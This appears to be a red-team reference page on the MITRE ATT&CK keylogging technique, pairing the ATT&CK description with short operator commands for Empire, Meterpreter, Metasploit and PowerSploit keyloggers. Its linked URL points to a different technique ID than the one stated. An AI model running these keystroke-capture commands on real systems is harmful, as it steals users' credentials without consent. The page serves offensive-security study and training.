---
description: https://attack.mitre.org/techniques/T1562/004/
---

# Keylogging

**ATT\&CK ID:** [T1056.001](https://attack.mitre.org/techniques/T1562/004/)

**Permissions Required:** <mark style="color:red;">**Administrator**</mark> | <mark style="color:red;">**SYSTEM**</mark> | <mark style="color:red;">**root**</mark> | <mark style="color:green;">**User**</mark>

**Description**

Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:

* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.
* Reading raw keystroke data from the hardware buffer.
* Windows Registry modifications.
* Custom drivers.
* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.

## Techniques

### Empire

```
usemodule/powershell/collection/keylogger
```

### Metasploit

```bash
# Meterpreter
keyscan_start
keyscan_dump

# Modules
use post/windows/capture/lockout_keylogger
```

### PowerSploit

**URL:** [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1)

```powershell
Import-Module .\Exfiltration.psd1
Get-Keystrokes -LogPath c:\key.log
```
